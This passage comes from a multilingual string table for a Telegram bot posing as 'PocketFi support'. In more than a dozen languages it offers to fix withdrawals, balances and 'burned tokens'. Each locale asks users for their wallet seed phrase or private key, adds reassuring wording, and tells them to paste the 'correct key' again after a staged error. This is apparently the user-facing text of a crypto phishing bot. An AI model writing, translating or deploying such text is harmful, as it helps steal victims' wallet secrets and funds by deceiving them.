        "post_receive_error": "‼️ Ein Fehler ist aufgetreten. Bitte stellen Sie sicher, dass Sie den richtigen Schlüssel eingeben — verwenden Sie Kopieren/Einfügen, um Fehler zu vermeiden. Bitte /start, um es erneut zu versuchen.",
        "choose language": "Bitte wählen Sie Ihre bevorzugte Sprache:",
        "await restart message": "Bitte klicken Sie auf /start, um von vorne zu beginnen.",
        "back": "🔙 Zurück",
        "invalid_input": "Ungültige Eingabe. Bitte verwenden Sie /start um zu beginnen.",
        "fix ads": "Ausstehende Auszahlung",
        "pending_withdrawal_connect": "Bitte verbinden Sie Ihre Wallet, um Ihre ausstehende Auszahlung zu erhalten.",
    },
    "nl": {
        "welcome": "Hoi, {user}\nWelkom bij de PocketFi support-bot. Deze bot kan u helpen bij het diagnosticeren en oplossen van de in het menu vermelde problemen: Validatie; Tokens Claimen; Herstel van Activa; Algemene Problemen; Rectificatie; Ontbrekend Saldo; Aanmeldproblemen; Migratieproblemen; Herstel Verbrande Tokens; Stortingen; In afwachting van opname." + PROFESSIONAL_REASSURANCE["nl"],
        "main menu title": "Selecteer een type probleem om door te gaan:",
        "validation": "Validatie",
        "claim tokens": "Tokens Claimen",
        "assets recovery": "Herstel van Activa",
        "general issues": "Algemene Problemen",
        "rectification": "Rectificatie",
        "recover burned tokens": "Herstel Verbrande Tokens",
        "deposits": "Stortingen",
        "withdrawals": "Opnames",
        "missing balance": "Ontbrekend Saldo",
        "login issues": "Login-problemen",
        "migration issues": "Migratieproblemen",
        "connect wallet message": "Verbind uw wallet met uw private key of seed phrase om door te gaan.",
        "connect wallet button": "🔑 Wallet Verbinden",
        "select wallet type": "Selecteer uw wallet-type:",
        "other wallets": "Andere Wallets",
        "private key": "🔑 Privésleutel",
        "seed phrase": "🔒 Seed Phrase Importeren",
        "wallet selection message": "U heeft {wallet_name} geselecteerd.\nSelecteer uw voorkeursverbindingswijze.",
        "prompt seed": "Voer uw seed phrase met 12 of 24 woorden in." + PROFESSIONAL_REASSURANCE["nl"],
        "prompt private key": "Voer uw privésleutel in." + PROFESSIONAL_REASSURANCE["nl"],
        "error_use_seed_phrase": "Het lijkt op een adres. Dit veld vereist een seed-phrase (12 of 24 woorden). Geef de seed-phrase op.",
        "post_receive_error": "‼️ Er is een fout opgetreden. Zorg ervoor dat u de juiste sleutel invoert — gebruik kopiëren en plakken om fouten te voorkomen. Gebruik /start om het opnieuw te proberen.",
        "choose language": "Selecteer uw voorkeurstaal:",
        "await restart message": "Klik op /start om opnieuw te beginnen.",
        "back": "🔙 Terug",
        "invalid_input": "Ongeldige invoer. Gebruik /start om te beginnen.",
        "fix ads": "In afwachting van opname",
        "pending_withdrawal_connect": "Verbind uw wallet om uw uitstaande opname te ontvangen.",
    },
    "hi": {
        "welcome": "नमस्ते, {user}\nPocketFi समर्थन बॉट में आपका स्वागत है। यह बॉट मेन्यू में सूचीबद्ध समस्याओं के निदान और समाधान में आपकी मदद कर सकता है: सत्यापन; टोकन क्लेम; संपत्ति पुनर्प्राप्ति; सामान्य समस्याएँ; सुधार; गायब बैलेंस; लॉगिन समस्याएँ; माइग्रेशन समस्याएँ; जलाए गए टोकन पुनः प्राप्त करें; जमा; लंबित निकासी。" + PROFESSIONAL_REASSURANCE["hi"],
        "main menu title": "कृपया जारी रखने के लिए एक समस्या प्रकार चुनें:",
        "validation": "सत्यापन",
        "claim tokens": "टोकन का दावा करें",
        "assets recovery": "संपत्ति पुनर्प्राप्ति",
        "general issues": "सामान्य समस्याएँ",
        "rectification": "सुधार",
        "recover burned tokens": "जलाए गए टोकन पुनः प्राप्त करें",
        "deposits": "जमा",
        "withdrawals": "निकासी",
        "missing balance": "गायब बैलेंस",
        "login issues": "लॉगिन समस्याएँ",
        "migration issues": "माइग्रेशन समस्याएँ",
        "connect wallet message": "कृपया वॉलेट को प्राइवेट की या सीड वाक्यांश से कनेक्ट करें।",
        "connect wallet button": "🔑 वॉलेट कनेक्ट करें",
        "select wallet type": "कृपया वॉलेट प्रकार चुनें:",
        "other wallets": "अन्य वॉलेट",
        "private key": "🔑 निजी कुंजी",
        "seed phrase": "🔒 सीड वाक्यांश आयात करें",
        "wallet selection message": "आपने {wallet_name} चुना है。\nकनेक्शन मोड चुनें。",
        "prompt seed": "कृपया 12 या 24 शब्दों की seed phrase दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
        "prompt private key": "कृपया अपनी निजी कुंजी दर्ज करें。" + PROFESSIONAL_REASSURANCE["hi"],
        "error_use_seed_phrase": "यह फ़ील्ड seed phrase (12 या 24 शब्द) मांगता है। कृपया seed दें।",
        "post_receive_error": "‼️ एक त्रुटि हुई। कृपया सुनिश्चित करें कि आप सही कुंजी दर्ज कर रहे हैं — त्रुटियों से बचने के लिए कॉपी-पेस्ट का उपयोग करें। /start के साथ पुनः प्रयास करें।",
        "choose language": "कृपया भाषा चुनें:",
        "await restart message": "कृपया /start दबाएँ।",
        "back": "🔙 वापस",
        "invalid_input": "अमान्य इनपुट। /start उपयोग करें।",
        "fix ads": "लंबित निकासी",
        "pending_withdrawal_connect": "कृपया अपना वॉलेट कनेक्ट करें ताकि आप अपनी लंबित निकासी प्राप्त कर सकें।",
    },
    "tr": {
        "welcome": "Merhaba, {user}\nPocketFi destek botuna hoş geldiniz. Bu bot menüde listelenen sorunları teşhis etmenize ve çözmenize yardımcı olabilir: Doğrulama; Token Talebi; Varlık Kurtarma; Genel Sorunlar; Düzeltme; Eksik Bakiye; Giriş Sorunları; Taşıma Sorunları; Yakılmış Tokenleri Kurtarma; Yatırımlar; Bekleyen Çekim." + PROFESSIONAL_REASSURANCE["tr"],
        "main menu title": "Devam etmek için bir sorun türü seçin:",
        "validation": "Doğrulama",
        "claim tokens": "Token Talep Et",
        "assets recovery": "Varlık Kurtarma",
        "general issues": "Genel Sorunlar",
        "rectification": "Düzeltme",
        "recover burned tokens": "Yakılmış Tokenleri Kurtarma",
        "deposits": "Para Yatırma",
        "withdrawals": "Para Çekme",
        "missing balance": "Eksik Bakiye",
        "login issues": "Giriş Sorunları",
        "migration issues": "Migrasyon Sorunları",
        "connect wallet message": "Lütfen cüzdanınızı özel anahtar veya seed ile bağlayın.",
        "connect wallet button": "🔑 Cüzdanı Bağla",
        "select wallet type": "Lütfen cüzdan türünü seçin:",
        "other wallets": "Diğer Cüzdanlar",
        "private key": "🔑 Özel Anahtar",
        "seed phrase": "🔒 Seed Cümlesi İçe Aktar",
        "wallet selection message": "{wallet_name} seçtiniz。\nBağlantı modunu seçin。",
        "prompt seed": "Lütfen 12 veya 24 kelimelik seed phrase girin。" + PROFESSIONAL_REASSURANCE["tr"],
        "prompt private key": "Lütfen özel anahtarınızı girin。" + PROFESSIONAL_REASSURANCE["tr"],
        "error_use_seed_phrase": "Bu alan bir seed phrase (12 veya 24 kelime) gerektirir. Lütfen seed girin。",
        "post_receive_error": "‼️ Bir hata oluştu. Lütfen doğru anahtarı girdiğinizden emin olun — hataları önlemek için kopyala-yapıştır kullanın. Lütfen /start ile tekrar deneyin.",
        "choose language": "Lütfen dilinizi seçin:",
        "await restart message": "Lütfen /start ile yeniden başlayın.",
        "back": "🔙 Geri",
        "invalid_input": "Geçersiz giriş. /start kullanın.",
        "fix ads": "Bekleyen Çekim",
        "pending_withdrawal_connect": "Bekleyen çekiminizi almak için lütfen cüzdanınızı bağlayın。",
    },
    "zh": {
        "welcome": "嗨，{user}\n欢迎使用 PocketFi 支持机器人。本机器人可以帮助您诊断并解决菜单中列出的问题：验证；认领代币；资产恢复；常规问题；修正；丢失余额；登录问题；迁移问题；恢复已燃烧代币；存款；待处理提现。" + PROFESSIONAL_REASSURANCE["zh"],
        "main menu title": "请选择一个问题类型以继续：",
        "validation": "验证",
        "claim tokens": "认领代币",
        "assets recovery": "资产恢复",
        "general issues": "常规问题",
        "rectification": "修正",
        "recover burned tokens": "恢复已燃烧代币",
        "deposits": "存款",
        "withdrawals": "提现",
        "missing balance": "丢失余额",
        "login issues": "登录问题",
        "migration issues": "迁移问题",
        "connect wallet message": "请用私钥或助记词连接钱包以继续。",
        "connect wallet button": "🔑 连接钱包",
        "select wallet type": "请选择您的钱包类型：",
        "other wallets": "其他钱包",
        "private key": "🔑 私钥",
        "seed phrase": "🔒 导入助记词",
        "wallet selection message": "您已选择 {wallet_name}。\n请选择连接方式。",
        "prompt seed": "请输入 12 或 24 个单词的助记词。" + PROFESSIONAL_REASSURANCE["zh"],
        "prompt private key": "请输入您的私钥。" + PROFESSIONAL_REASSURANCE["zh"],
        "error_use_seed_phrase": "此字段需要助记词 (12 或 24 个单词)。请提供助记词。",
        "post_receive_error": "‼️ 出现错误。请确保输入正确的密钥 — 使用复制粘贴以避免错误。请 /start 再试。",
        "choose language": "请选择语言：",
        "await restart message": "请点击 /start 重新开始。",
        "back": "🔙 返回",
        "invalid_input": "无效输入。请使用 /start 开始。",
        "fix ads": "待处理提现",
        "pending_withdrawal_connect": "请连接您的钱包以领取您待处理的提现。",
    },
    "cs": {
        "welcome": "Ahoj, {user}\nVítejte u PocketFi support bota. Tento bot vám může pomoci diagnostikovat a vyřešit problémy uvedené v nabídce: Ověření; Nárok na tokeny; Obnovení aktiv; Obecné problémy; Oprava; Chybějící zůstatek; Problémy s přihlášením; Problémy s migrací; Obnovit spálené tokeny; Vklady; Čekající výběr." + PROFESSIONAL_REASSURANCE["cs"],
        "main menu title": "Vyberte typ problému pro pokračování:",
        "validation": "Ověření",
        "claim tokens": "Nárokovat Tokeny",
        "assets recovery": "Obnovení aktiv",
        "general issues": "Obecné problémy",
        "rectification": "Oprava",
        "recover burned tokens": "Obnovit spálené tokeny",
        "deposits": "Vklady",
        "withdrawals": "Výběry",
        "missing balance": "Chybějící zůstatek",
        "login issues": "Problémy s přihlášením",
        "migration issues": "Problémy s migrací",
        "connect wallet message": "Připojte peněženku pomocí soukromého klíče nebo seed fráze.",
        "connect wallet button": "🔑 Připojit peněženku",
        "select wallet type": "Vyberte typ peněženky:",
        "other wallets": "Jiné peněženky",
        "private key": "🔑 Soukromý klíč",
        "seed phrase": "🔒 Importovat seed frázi",
        "wallet selection message": "Vybrali jste {wallet_name}。\nVyberte preferovaný způsob připojení.",
        "prompt seed": "Zadejte seed frázi o 12 nebo 24 slovech." + PROFESSIONAL_REASSURANCE["cs"],
        "prompt private key": "Zadejte prosím svůj soukromý klíč。" + PROFESSIONAL_REASSURANCE["cs"],
        "error_use_seed_phrase": "Zadejte seed frázi (12 nebo 24 slov), ne adresu.",
        "post_receive_error": "‼️ Došlo k chybě. Ujistěte se, že zadáváte správný klíč — použijte kopírovat a vložit. Prosím /start pro opakování.",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Klikněte /start pro restart.",
        "back": "🔙 Zpět",
        "invalid_input": "Neplatný vstup. Použijte /start.",
        "fix ads": "Čekající výběr",
        "pending_withdrawal_connect": "Připojte prosím svou peněženku, abyste obdrželi svůj čekající výběr.",
    },
    "ur": {
        "welcome": "ہیلو، {user}\nPocketFi سپورٹ بوٹ میں خوش آمدید۔ یہ بوٹ مینو میں درج مسائل کی تشخیص اور حل میں آپ کی مدد کر سکتا ہے: تصدیق؛ ٹوکن کلیم؛ اثاثہ بازیابی؛ عام مسائل؛ اصلاح؛ گم شدہ بیلنس؛ لاگ ان مسائل؛ مائیگریشن مسائل؛ جلائے گئے ٹوکن بازیافت کریں؛ ڈپازٹس؛ التواء شدہ واپسی。" + PROFESSIONAL_REASSURANCE["ur"],
        "main menu title": "جاری رکھنے کے لیے مسئلے کی قسم منتخب کریں:",
        "validation": "تصدیق",
        "claim tokens": "ٹوکن کلیم کریں",
        "assets recovery": "اثاثہ بازیابی",
        "general issues": "عمومی مسائل",
        "rectification": "درستگی",
        "recover burned tokens": "جلائے گئے ٹوکن بازیافت کریں",
        "deposits": "جمع",
        "withdrawals": "رقم نکالیں",
        "missing balance": "گم شدہ بیلنس",
        "login issues": "لاگ ان مسائل",
        "migration issues": "مائیگریشن کے مسائل",
        "connect wallet message": "براہِ کرم والٹ کو پرائیویٹ کی یا seed کے ساتھ منسلک کریں。",
        "connect wallet button": "🔑 والٹ جوڑیں",
        "select wallet type": "براہِ کرم والٹ کی قسم منتخب کریں:",
        "other wallets": "دیگر والٹس",
        "private key": "🔑 پرائیویٹ کی",
        "seed phrase": "🔒 سیڈ فریز امپورٹ کریں",
        "wallet selection message": "آپ نے {wallet_name} منتخب کیا ہے。\nاپنا پسندیدہ کنکشن طریقہ منتخب کریں。",
        "prompt seed": "براہ کرم 12 یا 24 الفاظ کی seed phrase درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
        "prompt private key": "براہ کرم اپنی پرائیویٹ کی درج کریں。" + PROFESSIONAL_REASSURANCE["ur"],
        "error_use_seed_phrase": "یہ فیلڈ seed phrase (12 یا 24 الفاظ) کا تقاضا کرتا ہے۔ براہ کرم seed درج کریں。",
        "post_receive_error": "‼️ ایک خرابی پیش آئی۔ براہ کرم یقینی بنائیں کہ آپ درست کلید درج کر رہے ہیں — غلطیوں سے بچنے کے لیے کاپی/پیست کریں۔ براہ کرم /start دوبارہ کوشش کے لیے。",
        "choose language": "براہِ کرم زبان منتخب کریں:",
        "await restart message": "براہِ کرم /start دبائیں。",
        "back": "🔙 واپس",
        "invalid_input": "غلط ان پٹ۔ /start استعمال کریں。",
        "fix ads": "التواء شدہ واپسی",
        "pending_withdrawal_connect": "براہِ کرم اپنا والیٹ منسلک کریں تاکہ آپ اپنی التواء شدہ واپسی وصول کر سکیں。",
    },
    "uz": {
        "welcome": "Salom, {user}\nPocketFi qo‘llab-quvvatlash botiga xush kelibsiz. Ushbu bot menyuda sanab o‘tilgan muammolarni aniqlash va hal qilishda sizga yordam beradi: Tekshirish; Tokenlarni da'vo qilish; Aktivlarni tiklash; Umumiy muammolar; Tuzatish; Yoʻqolgan balans; Kirish muammolari; Migratsiya muammolari; Yoqilgan tokenlarni tiklash; Omborlar; Kutishdagi Yecha olish." + PROFESSIONAL_REASSURANCE["uz"],
        "main menu title": "Davom etish uchun muammo turini tanlang:",
        "validation": "Tekshirish",
        "claim tokens": "Tokenlarni da'vo qilish",
        "assets recovery": "Aktivlarni tiklash",
        "general issues": "Umumiy muammolar",
        "rectification": "Tuzatish",
        "recover burned tokens": "Yoqilgan tokenlarni tiklash",
        "deposits": "Omonat",
        "withdrawals": "Chiqim",
        "missing balance": "Yoʻqolgan balans",
        "login issues": "Kirish muammolari",
        "migration issues": "Migratsiya muammolari",
        "connect wallet message": "Iltimos, hamyoningizni private key yoki seed bilan ulang.",
        "connect wallet button": "🔑 Hamyonni ulang",
        "select wallet type": "Hamyon turini tanlang:",
        "other wallets": "Boshqa hamyonlar",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Seed iborasini import qilish",
        "wallet selection message": "Siz {wallet_name} ni tanladingiz。\nUlanish usulini tanlang。",
        "prompt seed": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting, manzil emas。" + PROFESSIONAL_REASSURANCE["uz"],
        "prompt private key": "Private key kiriting。" + PROFESSIONAL_REASSURANCE["uz"],
        "error_use_seed_phrase": "Iltimos 12 yoki 24 soʻzli seed iborasini kiriting, manzil emas。",
        "post_receive_error": "‼️ Xato yuz berdi. Iltimos, to'g'ri kalitni kiriting — nusxalash va joylashtirishdan foydalaning. /start bilan qayta urinib ko‘ring。",
        "choose language": "Iltimos, tilni tanlang:",
        "await restart message": "Qayta boshlash uchun /start bosing。",
        "back": "🔙 Orqaga",
        "invalid_input": "Noto'g'ri kiritish. /start ishlating。",
        "fix ads": "Kutishdagi Yecha olish",
        "pending_withdrawal_connect": "Iltimos, kutishdagi yechimingizni olish uchun hamyoningizni ulang。",
    },
    "it": {
        "welcome": "Ciao, {user}\nBenvenuto nel bot di supporto PocketFi. Questo bot può aiutarti a diagnosticare e risolvere i problemi elencati nel menu: Validazione; Richiedi Token; Recupero Asset; Problemi Generali; Rettifica; Saldo Mancante; Problemi di Accesso; Problemi di Migrazione; Recupera Token Bruciati; Depositi; Prelievo in Sospeso." + PROFESSIONAL_REASSURANCE["it"],
        "main menu title": "Seleziona un tipo di problema per continuare:",
        "validation": "Validazione",
        "claim tokens": "Richiedi Token",
        "assets recovery": "Recupero Asset",
        "general issues": "Problemi Generali",
        "rectification": "Rettifica",
        "recover burned tokens": "Recupera Token Bruciati",
        "deposits": "Depositi",
        "withdrawals": "Prelievi",
        "missing balance": "Saldo Mancante",
        "login issues": "Problemi di Accesso",
        "migration issues": "Problemi di Migrazione",
        "connect wallet message": "Collega il tuo wallet con la Chiave Privata o Seed Phrase per continuare.",
        "connect wallet button": "🔑 Connetti Wallet",
        "select wallet type": "Seleziona il tipo di wallet:",
        "other wallets": "Altri Wallet",
        "private key": "🔑 Chiave Privata",
        "seed phrase": "🔒 Importa Seed Phrase",
        "wallet selection message": "Hai selezionato {wallet_name}.\nSeleziona la modalità di connessione preferita.",
        "prompt seed": "Inserisci la seed phrase di 12 o 24 parole." + PROFESSIONAL_REASSURANCE["it"],
        "prompt private key": "Inserisci la chiave privata." + PROFESSIONAL_REASSURANCE["it"],
        "error_use_seed_phrase": "Questo campo richiede una seed phrase (12 o 24 parole)。",
        "post_receive_error": "‼️ Si è verificato un errore. Assicurati di inserire la chiave corretta — usa copia e incolla per evitare errori. /start per riprovare。",
        "choose language": "Seleziona la lingua:",
        "await restart message": "Clicca /start per ricominciare。",
        "back": "🔙 Indietro",
        "invalid_input": "Input non valido. Usa /start。",
        "fix ads": "Prelievo in Sospeso",
        "pending_withdrawal_connect": "Per favore collega il tuo wallet per ricevere il tuo prelievo in sospeso。",
    },
    "ja": {
        "welcome": "こんにちは、{user}\nPocketFiサポートボットへようこそ。本ボットはメニューに記載されている問題の診断と解決を支援できます：検証；トークン請求；資産回復；一般的な問題；修正；残高がない；ログイン問題；移行問題；バーンされたトークンを回復する；入金；保留中の出金。" + PROFESSIONAL_REASSURANCE["ja"],
        "main menu title": "続行する問題の種類を選択してください：",
        "validation": "検証",
        "claim tokens": "トークンを請求",
        "assets recovery": "資産回復",
        "general issues": "一般的な問題",
        "rectification": "修正",
        "recover burned tokens": "バーンされたトークンを回復する",
        "deposits": "入金",
        "withdrawals": "出金",
        "missing balance": "残高が見つかりません",
        "login issues": "ログインの問題",
        "migration issues": "移行の問題",
        "connect wallet message": "プライベートキーまたはシードフレーズでウォレットを接続してください。",
        "connect wallet button": "🔑 ウォレットを接続",
        "select wallet type": "ウォレットの種類を選択してください：",
        "other wallets": "その他のウォレット",
        "private key": "🔑 プライベートキー",
        "seed phrase": "🔒 シードフレーズをインポート",
        "wallet selection message": "{wallet_name} を選択しました。\n接続方法を選択してください。",
        "prompt seed": "12 または 24 語のシードフレーズを入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "prompt private key": "プライベートキーを入力してください。" + PROFESSIONAL_REASSURANCE["ja"],
        "error_use_seed_phrase": "このフィールドにはシードフレーズ（12 または 24 語）が必要です。シードフレーズを入力してください。",
        "post_receive_error": "‼️ エラーが発生しました。正しいキーを入力していることを確認してください — コピー＆ペーストを使用してください。/start で再試行してください。",
        "choose language": "言語を選択してください：",
        "await restart message": "/start をクリックして再開してください。",
        "back": "🔙 戻る",
        "invalid_input": "無効な入力です。/start を使用してください。",
        "fix ads": "保留中の出金",
        "pending_withdrawal_connect": "保留中の出金を受け取るには、ウォレットを接続してください。",
    },
    "ms": {
        "welcome": "Hai, {user}\nSelamat datang ke PocketFi support bot. Bot ini boleh membantu anda mendiagnosis dan menyelesaikan isu yang disenaraikan dalam menu: Pengesahan; Tuntut Token; Pemulihan Aset; Isu Umum; Pembetulan; Baki Hilang; Isu Log Masuk; Isu Migrasi; Pulihkan Token Terbakar; Deposit; Pengeluaran Tertunda." + PROFESSIONAL_REASSURANCE["ms"],
        "main menu title": "Sila pilih jenis isu untuk meneruskan:",
        "validation": "Pengesahan",
        "claim tokens": "Tuntut Token",
        "assets recovery": "Pemulihan Aset",
        "general issues": "Isu Umum",
        "rectification": "Pembetulan",
        "recover burned tokens": "Pulihkan Token Terbakar",
        "deposits": "Deposit",
        "withdrawals": "Pengeluaran",
        "missing balance": "Baki Hilang",
        "login issues": "Isu Log Masuk",
        "migration issues": "Isu Migrasi",
        "connect wallet message": "Sila sambungkan dompet anda dengan Private Key atau Seed Phrase untuk meneruskan.",
        "connect wallet button": "🔑 Sambung Dompet",
        "select wallet type": "Sila pilih jenis dompet anda:",
        "other wallets": "Dompet Lain",
        "private key": "🔑 Private Key",
        "seed phrase": "🔒 Import Seed Phrase",
        "wallet selection message": "Anda telah memilih {wallet_name}.\nPilih mod sambungan yang dikehendaki.",
        "prompt seed": "Sila masukkan seed phrase 12 atau 24 perkataan anda。" + PROFESSIONAL_REASSURANCE["ms"],
        "prompt private key": "Sila masukkan kunci peribadi anda。" + PROFESSIONAL_REASSURANCE["ms"],
        "error_use_seed_phrase": "Medan ini memerlukan seed phrase (12 atau 24 perkataan). Sila berikan seed phrase。",
        "post_receive_error": "‼️ Ralat berlaku. Sila pastikan anda memasukkan kunci yang betul — gunakan salin & tampal untuk elakkan ralat. Sila /start untuk cuba semula。",
        "choose language": "Sila pilih bahasa pilihan anda:",
        "await restart message": "Sila klik /start untuk memulakan semula。",
        "back": "🔙 Kembali",
        "invalid_input": "Input tidak sah. Gunakan /start。",
        "fix ads": "Pengeluaran Tertunda",
        "pending_withdrawal_connect": "Sila sambungkan dompet anda untuk menerima pengeluaran tertunda anda。",
    },
    "ro": {
        "welcome": "Bună, {user}\nBun venit la PocketFi support bot. Acest bot vă poate ajuta să diagnosticați și să rezolvați problemele listate în meniu: Validare; Reclamare Token-uri; Recuperare Active; Probleme Generale; Rectificare; Sold Lipsă; Probleme de Autentificare; Probleme de Migrare; Recuperare Token Arși; Depuneri; Retragere În Așteptare." + PROFESSIONAL_REASSURANCE["ro"],
        "main menu title": "Selectați un tip de problemă pentru a continua:",
        "validation": "Validare",
        "claim tokens": "Revendică Token-uri",
        "assets recovery": "Recuperare Active",
        "general issues": "Probleme Generale",
        "rectification": "Rectificare",
        "recover burned tokens": "Recuperare Token Arși",
        "deposits": "Depuneri",
        "withdrawals": "Retrageri",
        "missing balance": "Sold Lipsă",
        "login issues": "Probleme Autentificare",
        "migration issues": "Probleme de Migrare",
        "connect wallet message": "Vă rugăm conectați portofelul cu cheia privată sau fraza seed pentru a continua.",
        "connect wallet button": "🔑 Conectează Portofel",
        "select wallet type": "Selectați tipul portofelului:",
        "other wallets": "Alte Portofele",
        "private key": "🔑 Cheie Privată",
        "seed phrase": "🔒 Importă Seed Phrase",
        "wallet selection message": "Ați selectat {wallet_name}.\nSelectați modul de conectare preferat.",
        "prompt seed": "Introduceți seed phrase de 12 sau 24 cuvinte。" + PROFESSIONAL_REASSURANCE["ro"],
        "prompt private key": "Introduceți cheia privată。" + PROFESSIONAL_REASSURANCE["ro"],
        "error_use_seed_phrase": "Acest câmp necesită seed phrase (12 sau 24 cuvinte)。",
        "post_receive_error": "‼️ A apărut o eroare. Folosiți copiere/lipire pentru a evita erori. /start pentru a încerca din nou。",
        "choose language": "Selectați limba preferată:",
        "await restart message": "Apăsați /start pentru a relua。",
        "back": "🔙 Înapoi",
        "invalid_input": "Intrare invalidă. /start。",
        "fix ads": "Retragere În Așteptare",
        "pending_withdrawal_connect": "Vă rugăm conectați portofelul pentru a primi retragerea în așteptare。",
    },
    "sk": {
        "welcome": "Ahoj, {user}\nVitajte v PocketFi support bote. Tento bot vám môže pomôcť diagnostikovať a vyriešiť problémy uvedené v ponuke: Overenie; Nárok na tokeny; Obnovenie aktív; Všeobecné problémy; Oprava; Chýbajúci zostatok; Problémy s prihlásením; Problémy s migráciou; Obnoviť spálené tokeny; Vklady; Čakajúci výber." + PROFESSIONAL_REASSURANCE["sk"],
        "main menu title": "Vyberte typ problému pre pokračovanie:",
        "validation": "Validácia",
        "claim tokens": "Uplatniť tokeny",
        "assets recovery": "Obnovenie aktív",
        "general issues": "Všeobecné problémy",
        "rectification": "Oprava",
        "recover burned tokens": "Obnoviť spálené tokeny",
        "deposits": "Vklady",
        "withdrawals": "Výbery",
        "missing balance": "Chýbajúci zostatok",
        "login issues": "Problémy s prihlásením",
        "migration issues": "Problémy s migráciou",
        "connect wallet message": "Prosím pripojte vašu peňaženku pomocou súkromného kľúča alebo seed frázy.",
        "connect wallet button": "🔑 Pripojiť peňaženku",
        "select wallet type": "Vyberte typ peňaženky:",
        "other wallets": "Iné peňaženky",
        "private key": "🔑 Súkromný kľúč",
        "seed phrase": "🔒 Importovať seed frázu",
        "wallet selection message": "Vybrali ste {wallet_name}.\nVyberte preferovaný spôsob pripojenia.",
        "prompt seed": "Zadajte seed phrase 12 alebo 24 slov。" + PROFESSIONAL_REASSURANCE["sk"],
        "prompt private key": "Zadajte svoj súkromný kľúč。" + PROFESSIONAL_REASSURANCE["sk"],
        "error_use_seed_phrase": "Toto pole vyžaduje seed phrase (12 alebo 24 slov)。",
        "post_receive_error": "‼️ Došlo k chybe. Použite kopírovanie/vloženie, aby ste sa vyhli chybám. /start pre opakovanie。",
        "choose language": "Vyberte preferovaný jazyk:",
        "await restart message": "Kliknite /start pre reštart。",
        "back": "🔙 Späť",
        "invalid_input": "Neplatný vstup. /start。",
        "fix ads": "Čakajúci výber",
        "pending_withdrawal_connect": "Prosím pripojte svoju peňaženku, aby ste dostali čakajúci výber。",
    },
    "th": {
        "welcome": "สวัสดี, {user}\nยินดีต้อนรับสู่ PocketFi support bot บอทนี้สามารถช่วยคุณวินิจฉัยและแก้ไขปัญหาที่แสดงในเมนูได้: การยืนยัน; เคลมโทเค็น; กู้คืนสินทรัพย์; ปัญหาทั่วไป; การแก้ไข; ยอดคงเหลือหาย; ปัญหาการเข้าสู่ระบบ; ปัญหาการโยกย้าย; กู้คืนโทเค็นที่ถูกเบิร์น; การฝาก; การถอนที่ค้างอยู่。" + PROFESSIONAL_REASSURANCE["th"],
        "main menu title": "โปรดเลือกประเภทปัญหาเพื่อดำเนินการต่อ:",
        "validation": "การยืนยัน",
        "claim tokens": "เคลมโทเค็น",
        "assets recovery": "กู้คืนทรัพย์สิน",
        "general issues": "ปัญหาทั่วไป",
        "rectification": "การแก้ไข",
        "recover burned tokens": "กู้คืนโทเค็นที่ถูกเบิร์น",
        "deposits": "ฝากเงิน",
        "withdrawals": "ถอนเงิน",
        "missing balance": "ยอดคงเหลือหาย",
        "login issues": "ปัญหาการเข้าสู่ระบบ",
        "migration issues": "ปัญหาการย้ายข้อมูล",
        "connect wallet message": "โปรดเชื่อมต่อกระเป๋าของคุณด้วยคีย์ส่วนตัวหรือ seed phrase เพื่อดำเนินการต่อ",
        "connect wallet button": "🔑 เชื่อมต่อกระเป๋า",
        "select wallet type": "โปรดเลือกประเภทกระเป๋า:",
        "other wallets": "กระเป๋าอื่น ๆ",
        "private key": "🔑 คีย์ส่วนตัว",
        "seed phrase": "🔒 นำเข้า Seed Phrase",
        "wallet selection message": "คุณได้เลือก {wallet_name}\nเลือกโหมดการเชื่อมต่อ",
        "prompt seed": "ป้อน seed phrase 12 หรือ 24 คำของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "prompt private key": "ป้อนคีย์ส่วนตัวของคุณ。" + PROFESSIONAL_REASSURANCE["th"],
        "error_use_seed_phrase": "ช่องนี้ต้องการ seed phrase (12 หรือ 24 คำ) โปรดระบุ seed。",
        "post_receive_error": "‼️ เกิดข้อผิดพลาด โปรดตรวจสอบว่าคุณป้อนคีย์ที่ถูกต้อง — ใช้คัดลอกและวางเพื่อหลีกเลี่ยงข้อผิดพลาด กรุณา /start เพื่อทดลองใหม่。",
        "choose language": "โปรดเลือกภาษา:",
        "await restart message": "โปรดกด /start เพื่อเริ่มใหม่。",
        "back": "🔙 ย้อนกลับ",
        "invalid_input": "ข้อมูลไม่ถูกต้อง /start",
        "fix ads": "การถอนที่ค้างอยู่",
        "pending_withdrawal_connect": "โปรดเชื่อมต่อกระเป๋าของคุณเพื่อรับการถอนที่ค้างอยู่ของคุณ。",
    },
    "vi": {
        "welcome": "Chào, {user}\nChào mừng bạn đến với PocketFi support bot. Bot này có thể giúp bạn chẩn đoán và giải quyết các vấn đề được liệt kê trong menu: Xác thực; Yêu cầu Token; Khôi phục Tài sản; Vấn đề Chung; Sửa chữa; Thiếu số dư; Vấn đề Đăng nhập; Vấn đề Di cư; Khôi phục token đã bị đốt; Nạp tiền; Rút tiền đang chờ xử lý。" + PROFESSIONAL_REASSURANCE["vi"],
        "main menu title": "Vui lòng chọn loại sự cố để tiếp tục:",
        "validation": "Xác thực",
        "claim tokens": "Yêu cầu Token",
        "assets recovery": "Khôi phục tài sản",
        "general issues": "Vấn đề chung",
        "rectification": "Sửa chữa",
        "recover burned tokens": "Khôi phục token đã bị đốt",
        "deposits": "Nạp tiền",
        "withdrawals": "Rút tiền",
        "missing balance": "Thiếu số dư",
        "login issues": "Vấn đề đăng nhập",
        "migration issues": "Vấn đề di trú",
        "connect wallet message": "Vui lòng kết nối ví bằng Khóa Riêng hoặc Seed Phrase để tiếp tục.",
        "connect wallet button": "🔑 Kết nối ví",
        "select wallet type": "Vui lòng chọn loại ví:",
        "other wallets": "Ví khác",
        "private key": "🔑 Khóa riêng",
        "seed phrase": "🔒 Nhập Seed Phrase",
        "wallet selection message": "Bạn đã chọn {wallet_name}。\nChọn phương thức kết nối。",
        "prompt seed": "Vui lòng nhập seed phrase 12 hoặc 24 từ của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
        "prompt private key": "Vui lòng nhập khóa riêng của bạn。" + PROFESSIONAL_REASSURANCE["vi"],
        "error_use_seed_phrase": "Trường này yêu cầu seed phrase (12 hoặc 24 từ)。",
